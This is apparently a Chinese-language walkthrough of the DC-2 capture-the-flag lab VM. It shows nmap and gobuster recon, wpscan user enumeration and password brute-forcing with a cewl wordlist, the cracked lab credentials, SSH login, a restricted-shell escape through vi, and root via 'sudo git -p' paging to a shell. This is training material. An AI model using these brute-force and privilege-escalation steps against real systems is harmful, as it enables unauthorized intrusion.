
## 靶机信息
- 级别：容易

## Recon
### nmap
```shell
nmap -sn 192.168.1.0/24
//IP:192.168.1.161

sudo nmap -sT --min-rate 10000 -p- 192.168.1.161 -oA tcp_scan/ports
PORT     STATE SERVICE
80/tcp   open  http
7744/tcp open  raqmon-pdu

sudo nmap -sT -sV -sC -O -p 80,7744 192.168.1.161 -oA tcp_scan/details
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Did not follow redirect to http://dc-2/
|_http-server-header: Apache/2.4.10 (Debian)
MAC Address: 00:0C:29:E1:30:26 (VMware)


```

## Web


```shell
//修改本机hosts文件
sudo vim /etc/hosts //添加一条 192.168.1.161   dc-2

//看到是wordpress
```
### 目录爆破

```shell
gobuster dir -u http://192.168.1.161 -w /usr/share/wordlists/dirb/common.txt

/wp-admin             (Status: 301) [Size: 317] [--> http://192.168.1.161/wp-admin/]
/wp-content           (Status: 301) [Size: 319] [--> http://192.168.1.161/wp-content/]
/wp-includes          (Status: 301) [Size: 320] [--> http://192.168.1.161/wp-includes/]
```

![[Pasted image 20231019161445.png]]
```shell
 是一个Wordpress搭建的网站，使用wpscan枚举用户名
 wpscan --url dc-2 -e u //最好关掉http_proxy和https_proxy
```
![[Pasted image 20231019171859.png]]
发现了三个用户
```shell
admin jerry tom
```

提示使用cewl

### cewl
```shell
"Cewl" 是一个用于收集网站上的单词和短语的命令行工具。这个工具通常用于信息收集和渗透测试，以帮助渗透测试人员和安全专家收集有关目标网站的有用信息，例如潜在的用户名、密码、子域名、敏感词汇等。

"Cewl" 的名称是"Custom Word List Generator"的缩写，它的主要功能是生成自定义单词列表。工具的使用通常需要指定目标网站的 URL，并可以选择不同的选项，以定制生成的单词列表的内容。

"Cewl" 工作的方式通常是通过爬行目标网站的网页，提取其中的文本，并然后从中提取单词和短语。这些单词和短语可以用于后续渗透测试、口令破解、社会工程学攻击等任务。
```

```shell
cewl http://dc-2 > password
```

### WpScan爆破
```shell
wpscan --url dc-2 -U user -P password  
[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - jerry / adipiscing                                                                                                        
[SUCCESS] - tom / parturient

cat  creds | awk -F '-' '{print $2}' | > creds //信息处理
```

![[Pasted image 20231019172911.png]]

登录wp-admin找到flag2

flag2提示：If you can't exploit WordPress and take a shortcut, there is another way.

根据提示尝试用tom账户登录ssh，成功登录
```shell
ssh tom@192.168.1.161 -p 7744
//passwd:parturient
```

### Way2(Wordpress利用)
```shell
这里是不能利用的，因为没有开启主题和插件，则无法上传反弹shell
```



## 提权

```shell
less flag3.txt
```

![[Pasted image 20231019173557.png]]

```shell
刚登录时发现绝大部分命令都不能运行 使用vi进行逃逸
vi
:set shell=/bin/sh
:shell
然而换成sh还是不能执行命令，添加一下环境变量

export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

```shell
1. `export`：这是一个用于设置环境变量的命令。通过使用 `export` 命令，您可以将一个值分配给一个环境变量，使它在当前会话中可用。
    
2. `PATH`：`PATH` 是一个特殊的环境变量，它包含一组目录的路径，系统会在这些目录中查找可执行文件。这些目录路径之间使用冒号 `:` 分隔。
    
3. `=$PATH`：这部分将现有的 `PATH` 环境变量的值分配给 `PATH` 变量。这是为了确保不会丢失现有的 `PATH` 配置。
    
4. `:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`：这部分是要添加到 `PATH` 中的新路径。每个路径之间都使用冒号 `:` 分隔。这些路径列出了一些系统中常用的可执行文件的存储位置。
    
    - `/usr/local/sbin` 和 `/usr/local/bin`：这些目录通常包含用户自定义安装的软件的可执行文件。这里存放的程序通常是管理员或用户自己安装的，而不是系统自带的。
    - `/usr/sbin` 和 `/usr/bin`：这些目录包含系统自带的可执行文件，通常由操作系统提供。
    - `/sbin` 和 `/bin`：这些目录包含系统维护和恢复工具，例如重启、挂载文件系统等。

这个命令的目的是将用户自定义的可执行文件目录（`/usr/local/sbin` 和 `/usr/local/bin`）以及系统默认的可执行文件目录（`/usr/sbin`、`/usr/bin`、`/sbin` 和 `/bin`）添加到 `PATH` 中，以便在终端会话中能够直接运行这些可执行文件，而不必提供完整的路径。这对于用户自定义安装的软件或脚本非常有用，因为它们通常存储在 `/usr/local` 目录下，而不在默认的系统可执行文件目录中。
```

```shell
在tom用户中进行尝试，没有找打提权的路径，passwd文件中看到jerry用户，根据提示切换到jerry
```
![[Pasted image 20231019175019.png]]
```shell
sudo git -p help config
-p:[-p|--paginate|--no-pager] //可以调用命令
!/bin/bash
```
![[Pasted image 20231019175220.png]]
